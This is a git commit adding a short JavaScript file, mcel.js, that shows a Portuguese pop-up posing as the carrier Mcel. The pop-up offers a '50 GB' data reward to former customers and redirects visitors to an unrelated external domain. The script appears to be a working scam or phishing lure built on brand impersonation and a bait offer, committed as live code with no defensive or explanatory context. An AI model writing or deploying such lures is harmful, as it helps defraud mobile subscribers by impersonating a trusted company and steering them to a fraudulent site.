f2db68fb228c7648107d123f06aba367ff6bf4f6
newetijazz1 <newetijazz1@gmail.com>
2025-08-20 09:32:02 +0100

    Create mcel.js

---
+++ mcel.js
@@ -0,0 +1,6 @@
+
+var password = 'Mcel 50gb'
+password=prompt('Mcel: Olá cliente, por favor, verifique se o cartão SIM Mcel é elegível para receber a recompensa de 50 GB de dados de clientes antigos, pressione OK para obter esta oferta','Mcel 50gb');
+if (password != 'Mcel 50gb') {
+location.href='https://www.isadata.xyz/Mcel50gb';
+}
